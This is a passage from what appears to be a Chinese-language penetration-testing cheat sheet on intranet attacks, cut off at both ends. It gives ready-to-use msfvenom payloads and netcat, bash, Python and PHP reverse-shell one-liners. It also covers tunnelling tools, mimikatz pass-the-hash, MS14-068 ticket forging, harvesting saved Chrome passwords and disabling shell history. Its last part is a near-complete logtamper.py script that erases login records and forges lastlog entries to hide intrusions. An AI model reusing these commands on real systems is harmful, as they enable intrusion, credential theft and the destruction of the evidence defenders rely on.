-f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><p>Python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverser_tcp LHOST= LPORT= -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><h3 id="其他权限维持"><a href="#其他权限维持" class="headerlink" title="其他权限维持"></a>其他权限维持</h3><p>使用msf在主机上注册一个服务，上传服务启动文件，隐藏等</p><h3 id="渗透框架"><a href="#渗透框架" class="headerlink" title="渗透框架"></a>渗透框架</h3><h4 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>编写shell反弹工具，拿到shell后和稳定程序绑定</p><h2 id="内网渗透代理"><a href="#内网渗透代理" class="headerlink" title="内网渗透代理"></a>内网渗透代理</h2><h3 id="Lcx端口转发"><a href="#Lcx端口转发" class="headerlink" title="Lcx端口转发"></a>Lcx端口转发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机--主机A(1.1.1.2)---防火墙---主机B(192.168.1.2)</span><br></pre></td></tr></table></figure><p>跳板机转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">portmap -m 2 -p1 3950 -h2 1.1.1.2 -p2 3951</span><br><span class="line">Lcx.exe –listen 3950 3951</span><br><span class="line">将公网服务器的3950端口监听的数据转发到3951</span><br></pre></td></tr></table></figure><p>靶机转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 1.1.1.2 3950 192.168.1.2 3389</span><br><span class="line">将靶机的3389转发到公网服务器的3950上</span><br></pre></td></tr></table></figure><h3 id="ssh端口转发"><a href="#ssh端口转发" class="headerlink" title="ssh端口转发"></a>ssh端口转发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C: 请求压缩所有数据</span><br><span class="line">-D: port 指定一个本地机器动态的应用程序端口转发</span><br><span class="line">-f: 要求在执行命令前退至后台</span><br><span class="line">-g: 允许远端主机连接本地转发的端口</span><br><span class="line">-L: 将本地机(客户机)的某个端口转发到远端指定机器的指定端口</span><br><span class="line">-N: 不执行远程命令. 用于转发端口.</span><br><span class="line">-R: 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口</span><br></pre></td></tr></table></figure><h4 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机--主机A(1.1.1.2)---防火墙---主机B(192.168.1.2)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 1111:192.168.1.2:80 -fN 1.1.1.2</span><br><span class="line">利用公网跳板机将192.168.1.2的80端口转发到1.1.1.2的1111端口</span><br></pre></td></tr></table></figure><h4 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机(1.1.1.1)---防火墙---主机B(192.168.1.2)</span><br><span class="line">     |--主机A(192.168.1.1)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1111:192.168.1.2:80 -fN 1.1.1.1</span><br><span class="line">利用内网跳板机将192.168.1.2的80端口转发到1.1.1.1的1111端口</span><br></pre></td></tr></table></figure><h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机---主机A(1.1.1.2)---防火墙---主机B(192.168.1.2)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 -DfNg 1.1.1.2</span><br></pre></td></tr></table></figure><p>利用<code>proxychains</code>代理即可</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-c: 指定连接后要执行的shell命令</span><br><span class="line">-e: 指定连接后要执行的文件名</span><br><span class="line">-k: 配置Socker一直存活</span><br><span class="line">-l: 监听模式</span><br><span class="line">-p: 指定端口</span><br><span class="line">-u: 启动UDP协议传输</span><br><span class="line">-v: 显示指令执行过程</span><br></pre></td></tr></table></figure><h4 id="nc正向shell"><a href="#nc正向shell" class="headerlink" title="nc正向shell"></a>nc正向shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1111 -e /bin/bash</span><br><span class="line">监听本地1111端口，连接成功执行/bin/bash</span><br></pre></td></tr></table></figure><h4 id="nc反向shell"><a href="#nc反向shell" class="headerlink" title="nc反向shell"></a>nc反向shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 1.1.1.1 1111</span><br></pre></td></tr></table></figure><h4 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="variable">$&#123;HOST&#125;</span>/<span class="variable">$&#123;POST&#125;</span> 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h4 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;$&#123;HOST&#125;&quot;,$&#123;POST&#125;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;$&#123;HOST&#125;&quot;,$&#123;POST&#125;);exec(&quot;/bin/sh -i &amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="隐秘隧道搭建"><a href="#隐秘隧道搭建" class="headerlink" title="隐秘隧道搭建"></a>隐秘隧道搭建</h2><h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><p>服务器配置</p><blockquote><p>frps.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000# 要绑定的端口</span><br><span class="line"></span><br><span class="line">dashboard_user &#x3D; admin# 控制台的用户名</span><br><span class="line">dashboard_pwd &#x3D; admin# 控制台的密码</span><br><span class="line">dashboard_port &#x3D; 6500# 控制台的端口</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frps -c frps.ini</span><br></pre></td></tr></table></figure><p>客户端设置</p><blockquote><p>frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.100.101 #代理服务器ip地址</span><br><span class="line">server_port &#x3D; 7000#代理服务器设置绑定的端口</span><br><span class="line"></span><br><span class="line">[rdp]# 反向代理名称</span><br><span class="line">type &#x3D; tcp# 协议类型</span><br><span class="line">local_ip &#x3D; 107.0.0.1 # 本机ip地址</span><br><span class="line">local_post &#x3D; 3389 # 远程桌面的默认端口</span><br><span class="line">remote_post &#x3D; 6005 # 对外访问的端口</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frps -c frps.ini</span><br></pre></td></tr></table></figure><p><code>mstsc.exe</code>远程桌面直接连接<code>192.168.122.18:6005</code>即可</p><h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><p>正向代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 888</span><br></pre></td></tr></table></figure><p>之后利用<code>Proxifier</code>代理即可</p><h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -l 192.168.122.17 -p 8080 -u http://192.168.122.18/tunnel.nosocket.php</span><br></pre></td></tr></table></figure><p>之后利用<code>Proxifier</code>代理即可，设置代理规则<code>applications</code>为<code>python.exe</code>，<code>Action</code>为<code>Direct</code></p><h2 id="内网常见攻击"><a href="#内网常见攻击" class="headerlink" title="内网常见攻击"></a>内网常见攻击</h2><h3 id="MS17-010等"><a href="#MS17-010等" class="headerlink" title="MS17-010等"></a>MS17-010等</h3><p>利用msf远程利用即可</p><h3 id="网络设备漏洞"><a href="#网络设备漏洞" class="headerlink" title="网络设备漏洞"></a>网络设备漏洞</h3><p>路由器常见漏洞</p><blockquote><p>命令执行\未授权访问\拒绝服务\自带后门</p></blockquote><h3 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h3><p>Cobalt Strike钓鱼、Swaks配合CS钓鱼、Word/Excel宏钓鱼、PPSX钓鱼(PPT动作特性构造)、文件名反转、重定向钓鱼、自解压等</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><h4 id="常用cmd指令"><a href="#常用cmd指令" class="headerlink" title="常用cmd指令"></a>常用cmd指令</h4><blockquote><p><code>net user</code> 查看本机用户<br><code>net user /domain</code> 查看域内用户<br><code>tasklist</code> 查看当前进程<br><code>netstat -ano</code> 查看端口列表<br><code>systeminfo</code> 查看修补程序<br><code>wmic qfe list full</code> 查看补丁信息</p></blockquote><h4 id="查看域信息"><a href="#查看域信息" class="headerlink" title="查看域信息"></a>查看域信息</h4><p>计算机右键属性即可</p><h4 id="用户习惯"><a href="#用户习惯" class="headerlink" title="用户习惯"></a>用户习惯</h4><ol><li>计划任务 <code>【开始】→【管理工具】→【任务计划程序】</code></li><li>最近打开的文档 <code>C:\Users\Administrator\Recent</code></li><li>收藏夹</li><li>文件搜索</li><li>历史记录等</li></ol><h4 id="密码收集"><a href="#密码收集" class="headerlink" title="密码收集"></a>密码收集</h4><ol><li>mimikatz</li><li>谷歌浏览器密码库 <code>C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data</code>，使用<a href="https://github.com/pawelsalawa/sqlitestudio/releases">SQLiteStudio</a>打开等</li></ol><h3 id="域控攻击"><a href="#域控攻击" class="headerlink" title="域控攻击"></a>域控攻击</h3><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>漏洞利用步骤：</p><ol><li>获取SID <code>whoami /user</code></li><li>生成伪造票据 <code>ms14-086.exe -u (域用户@域) -p (域用户密码) -s (sid) -d (ac_ip)</code></li><li>删除缓存票据 <code>klist purge</code></li><li>导入票据获取域控权限 <code>kerberos::ptc 自定义命名.ccache</code></li><li>尝试列举域控C盘文件 <code>dir \\dc.really.com\c$</code></li></ol><h4 id="MS14-025"><a href="#MS14-025" class="headerlink" title="MS14-025"></a>MS14-025</h4><blockquote><p>在利用“MS14-025”漏洞开始之前需先知道利用失败或者出错可能是什么原因造成的，一般存在以下几种原因：</p><p>A．安装了GPP凭证补丁：KB2962486，这个补丁禁止在组策略配置中填入密码，补丁查询命令systeminfo查询是否有安装“KB2962486”补丁。<br>B．不在组策略中使用域控密码。<br>C．SYSVOL文件夹访问权限。<br>D．可能没使用GPP配置。</p></blockquote><p>漏洞利用步骤：</p><ol><li>判断SYSVOL文件夹访问权限。</li><li>查找XML文件。 <code>Groups.xml</code></li><li>解密XML文件中加密的密码信息。 <code>cpassword</code></li></ol><h4 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass the Hash"></a>Pass the Hash</h4><p>在使用NTLM身份验证的系统或服务上，用户密码永远不会以明文形式通过网络发送。本机Windows应用程序要求用户提供明文密码，然后调用LsaLogonUser 之类的API，将该密码转换为一个或两个哈希值（LM或NT哈希），然后在NTLM身份验证期间将其发送到远程服务器。对这种机制的分析表明，成功完成网络身份验证不需要明文密码，只需要哈希即可。</p><p>如果攻击者具有用户密码的哈希值，则无需强行使用明文密码；可以简单地使用已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成的原始密码。</p><p>攻击步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、获取NTLM Hash</span><br><span class="line">privilege::debug提升为debug权限</span><br><span class="line">sekurlsa::logonpasswords 显示最近登录过的用户和最近登录过的计算机的凭证</span><br><span class="line">2、hash传递</span><br><span class="line">sekurlsa::pth &#x2F;user:用户 &#x2F;domain:域 &#x2F;ntlm:hash</span><br></pre></td></tr></table></figure><h4 id="Ntml-Hash获取"><a href="#Ntml-Hash获取" class="headerlink" title="Ntml Hash获取"></a>Ntml Hash获取</h4><p>利用Responder工具，（搭建SMB服务、SQL服务器、FTP、HTTP等）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Dawn_whisper\AppData\Roaming\Typora\typora-user-images\image-20220714160306097.png" alt="image-20220714160306097"></p><h3 id="域权限维持"><a href="#域权限维持" class="headerlink" title="域权限维持"></a>域权限维持</h3><ol><li>使用黄金票据</li><li>SSP权限维持</li><li>Memory Updateing of SSPs权限维持</li><li>GPO组策略权限维持</li></ol><h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>常用cmd命令</p><blockquote><p><code>net view /domain</code> 查看当前存在几个域<br><code>net time /domain</code> 查看域时间及域服务器的名字<br><code>ipconfig /all</code>  可查询DNS服务器<br><code>ping xxx.com</code> 获取域控制器IP，或者<code>nslookup、set type=a、really.com</code><br><code>net group “Domain Controllers” /domain</code> 查看域控主机名称<br><code>net group “domain admins” /domain</code> 查看域管理员</p></blockquote><h2 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h2><h3 id="Linux日志"><a href="#Linux日志" class="headerlink" title="Linux日志"></a>Linux日志</h3><blockquote><p><code>history</code> 查看命令历史记录<br><code>history -c</code> 清除命令历史记录</p></blockquote><p>设置不记录历史命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG</span><br><span class="line"><span class="built_in">export</span> HISTFILE=/dev/null</span><br><span class="line"><span class="built_in">export</span> HISTSIZE=0</span><br><span class="line"><span class="built_in">export</span> HISTFILESIZE=0</span><br></pre></td></tr></table></figure><blockquote><p><code>w</code> 查看utmp日志</p></blockquote><p>利用logtamper工具进行删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python logtamper.py –m 1 –u root –i 192.168.122.16</span><br></pre></td></tr></table></figure><blockquote><p><code>w</code> 查看wtmp日志</p></blockquote><p>同上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python logtamper.py –m 2 –u root –i 192.168.122.16</span><br></pre></td></tr></table></figure><blockquote><p><code>lastlog</code> 查看lastlog日志</p></blockquote><p>将上次登录事件修改为2018年9月24日10:11:12</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python logtamper.py –m 3 –u root –i 192.168.122.16 –t tty1 –d 2018:09:24:10:11:12</span><br></pre></td></tr></table></figure><p>logtamper.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> os, struct, sys</span><br><span class="line"><span class="keyword">from</span> pwd <span class="keyword">import</span> getpwnam</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> strptime, mktime</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">  </span><br><span class="line">UTMPFILE = <span class="string">&quot;/var/run/utmp&quot;</span></span><br><span class="line">WTMPFILE = <span class="string">&quot;/var/log/wtmp&quot;</span></span><br><span class="line">LASTLOGFILE = <span class="string">&quot;/var/log/lastlog&quot;</span></span><br><span class="line">  </span><br><span class="line">LAST_STRUCT = <span class="string">&#x27;I32s256s&#x27;</span></span><br><span class="line">LAST_STRUCT_SIZE = struct.calcsize(LAST_STRUCT)</span><br><span class="line">  </span><br><span class="line">XTMP_STRUCT = <span class="string">&#x27;hi32s4s32s256shhiii4i20x&#x27;</span></span><br><span class="line">XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getXtmp</span>(<span class="params">filename, username, hostname</span>):</span></span><br><span class="line">    xtmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = open(filename, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            bytes = fp.read(XTMP_STRUCT_SIZE)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> bytes:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">  </span><br><span class="line">            data = struct.unpack(XTMP_STRUCT, bytes)</span><br><span class="line">            record = [(<span class="keyword">lambda</span> s: str(s).split(<span class="string">&quot;\0&quot;</span>, <span class="number">1</span>)[<span class="number">0</span>])(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">            <span class="keyword">if</span> (record[<span class="number">4</span>] == username <span class="keyword">and</span> record[<span class="number">5</span>] == hostname):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            xtmp += bytes</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;Cannot open file: %s&#x27;</span> % filename)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        fp.close()</span><br><span class="line">    <span class="keyword">return</span> xtmp</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modifyLast</span>(<span class="params">filename, username, hostname, ttyname, strtime</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = getpwnam(username)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;No such user.&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">    timestamp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        str2time = strptime(strtime, <span class="string">&#x27;%Y:%m:%d:%H:%M:%S&#x27;</span>)</span><br><span class="line">        timestamp = int(mktime(str2time))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;Time format err.&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">    data = struct.pack(LAST_STRUCT, timestamp, ttyname, hostname)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = open(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        fp.seek(LAST_STRUCT_SIZE * p.pw_uid)</span><br><span class="line">        fp.write(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;Cannot open file: %s&#x27;</span> % filename)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        fp.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showMessage</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">print</span> msg</span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveFile</span>(<span class="params">filename, contents</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = open(filename, <span class="string">&#x27;w+b&#x27;</span>)</span><br><span class="line">        fp.write(contents)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        showMessage(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        fp.close()</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    usage = <span class="string">&#x27;usage: logtamper.py -m 2 -u root -i 192.168.0.188\n \</span></span><br><span class="line"><span class="string">        logtamper.py -m 3 -u root -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12&#x27;</span></span><br><span class="line">    parser = OptionParser(usage=usage)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-m&#x27;</span>, <span class="string">&#x27;--mode&#x27;</span>, dest=<span class="string">&#x27;MODE&#x27;</span>, default=<span class="string">&#x27;1&#x27;</span> , help=<span class="string">&#x27;1: utmp, 2: wtmp, 3: lastlog [default: 1]&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--ttyname&#x27;</span>, dest=<span class="string">&#x27;TTYNAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--filename&#x27;</span>, dest=<span class="string">&#x27;FILENAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, dest=<span class="string">&#x27;USERNAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--hostname&#x27;</span>, dest=<span class="string">&#x27;HOSTNAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--dateline&#x27;</span>, dest=<span class="string">&#x27;DATELINE&#x27;</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> len(args) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> options.MODE == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> options.USERNAME == <span class="literal">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="literal">None</span>:</span><br><span class="line">                showMessage(<span class="string">&#x27;+[Warning]: Incorrect parameter.\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> options.FILENAME == <span class="literal">None</span>:</span><br><span class="line">                options.FILENAME = UTMPFILE</span><br><span class="line">  </span><br><span class="line">            <span class="comment"># tamper</span></span><br><span class="line">            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)</span><br><span class="line">            saveFile(options.FILENAME, newData)</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">elif</span> options.MODE == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> options.USERNAME == <span class="literal">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="literal">None</span>:</span><br><span class="line">                showMessage(<span class="string">&#x27;+[Warning]: Incorrect parameter.\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> options.FILENAME == <span class="literal">None</span>:</span><br><span class="line">                options.FILENAME = WTMPFILE</span><br><span class="line">  </span><br><span class="line">            <span class="comment"># tamper</span></span><br><span class="line">            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)</span><br><span class="line">            saveFile(options.FILENAME, newData)</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">elif</span> options.MODE == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> options.USERNAME == <span class="literal">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="literal">None</span> <span class="keyword">or</span> options.TTYNAME == <span class="literal">None</span> <span class="keyword">or</span> options.DATELINE == <span class="literal">None</span>:</span><br><span class="line">                showMessage(<span class="string">&#x27;+[Warning]: Incorrect parameter.\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> options.FILENAME == <span class="literal">None</span>:</span><br><span class="line">                options.FILENAME = LASTLOGFILE</span><br><span class="line">  </span><br><span class="line">            <span class="comment"># tamper</span></span><br><span class="line">            modifyLast(options.FILENAME, 